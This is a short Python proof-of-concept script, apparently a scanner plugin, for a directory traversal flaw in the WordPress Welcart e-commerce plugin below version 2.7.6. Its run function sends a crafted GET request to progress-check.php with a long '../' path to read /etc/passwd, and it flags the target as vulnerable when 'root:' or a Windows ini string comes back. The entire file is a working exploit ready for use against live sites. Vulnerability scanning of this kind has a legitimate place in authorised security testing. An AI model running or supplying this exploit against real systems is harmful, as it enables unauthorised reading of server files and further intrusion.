#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ['https://stack.chaitin.com/poc/detail?id=1028']
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "WordPress Welcart 电子商务插件（版本 < 2.7.6）目录遍历漏洞"
  ret['level'] = "high"
  ret['FOFA'] =''
  ret['author'] ='ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target="/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd"
  url1=url+target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret